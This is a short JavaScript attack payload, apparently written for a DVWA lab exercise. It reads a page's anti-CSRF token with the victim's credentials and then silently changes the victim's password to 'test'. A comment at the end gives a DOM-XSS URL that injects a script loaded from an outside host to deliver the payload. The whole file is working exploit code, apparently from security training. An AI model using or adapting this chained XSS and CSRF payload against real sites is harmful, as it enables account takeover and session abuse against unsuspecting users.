// alert(document.cookie);

var theUrl = 'http://140.118.121.110:22334/DVWA-master/vulnerabilities/csrf/';

if(window.XMLHttpRequest) {
    xmlhttp = new XMLHttpRequest();
}else{
    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
}

var count = 0;
xmlhttp.withCredentials = true;

xmlhttp.onreadystatechange = function(){
    if(xmlhttp.readyState == 4 && xmlhttp.status == 200)
    {
        var text = xmlhttp.responseText;
        var regex = /user_token\' value\=\'(.*?)\' \/\>/;
        var match = text.match(regex);
        // console.log(match);
        // alert(match[1]);
        var token = match[1];
        var new_url = 'http://140.118.121.110:22334/DVWA-master/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change&user_token=' + token + '#';
        if(count == 0){
            count++;
            xmlhttp.open("GET", new_url, false);
            xmlhttp.send();
        }
    }
};

xmlhttp.open("GET", theUrl, false);
xmlhttp.send();

// http://140.118.121.110:22334/DVWA-master/vulnerabilities/xss_d/?default=English#<script src="http://140.118.121.100/xss.js"></script>

